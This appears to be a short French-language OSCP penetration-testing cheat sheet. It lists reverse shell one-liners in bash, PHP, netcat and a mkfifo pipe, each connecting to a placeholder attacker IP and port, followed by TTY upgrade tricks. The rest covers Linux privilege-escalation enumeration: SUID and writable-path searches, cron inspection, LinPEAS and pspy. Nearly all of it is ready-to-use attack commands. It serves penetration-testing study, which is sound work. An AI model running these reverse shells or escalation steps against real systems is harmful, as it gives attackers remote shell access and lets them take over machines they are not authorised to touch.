<img src="https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/f9d72356-a603-42c4-92b4-dfeff2f868b8" width="450">

## Reverse shell:
Ouvrir un port coté attaquant : nc -lvp [PORT]  
bash -i >& /dev/tcp/[IP]/[PORT] 0>&1  
php -r '$s=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'  
nc [IP] [PORT] -e /bin/bash  
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc [IP] [PORT] > f  

Plus de méthodes ici : https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/  

### Spawn TTY:
•	python -c 'import pty; pty.spawn("/bin/sh")'  
•	SHELL=/bin/bash script -q /dev/null  
•	/usr/bin/script -qc /bin/bash /dev/null  
Upgrade reverse shell:  
1.	Ctrl + Z  
2.	stty raw -echo ; fg  
## Énumération :
**Liste les répertoires accessibles en écriture :** find / -type d -writable 2> /dev/null  
**Liste des SUID:** find / -type f -perm /6000 -ls 2>/dev/null  

**Script pour l'énumération :**  
•	lse.sh  
•	LinEnum.sh  
•	LinPEAS.sh  

**Voir la version du système :**  
•	Version du noyau: uname -mr  
•	Version de l'OS: lsb_release -a  

**Voir les processus qui sont executés en arrière-plan:**  
•	pspy  
•	Voir si il y a une crontab  de configurée: cat /etc/crontab  

**Voir les ports en écoute :**  
netstat -tulpn  
Exploitation des droits SUDO/SUID sur des binaires connu:  
https://gtfobins.github.io/
